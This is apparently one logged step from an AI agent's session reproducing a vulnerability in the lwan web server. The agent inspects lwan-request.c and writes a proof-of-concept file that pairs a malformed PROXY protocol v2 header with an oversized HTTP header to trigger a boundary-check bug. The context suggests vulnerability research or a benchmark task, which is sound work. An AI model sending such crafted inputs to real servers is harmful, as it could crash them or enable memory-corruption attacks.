Running command: cd /workspace/repo-vul/src-vul/lwan && nl -ba src/lib/lwan-request.c | sed -n '223,281p' && python3 - <<'PY'
from pathlib import Path
# Try an alternative candidate focused on the malformed boundary check and a larger header length.
p=Path('/workspace/poc.bin')
sig = b'\r\n\r\n\x00\r\nQUIT\n'
# len=0x0000 and LOCAL command, followed by a long body to exercise memmem on the remainder.
header = sig + bytes([0x20,0x11,0x00,0x00])
body = b'GET /proxy HTTP/1.0\r\nHost: x\r\nX:' + b'A'*1000 + b'\r\n\r\n'
p.write_bytes(header + body)
print(len(header), len(body))
PY
